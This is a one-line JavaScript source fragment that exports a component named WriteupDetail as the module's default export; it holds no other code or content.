export default WriteupDetail;
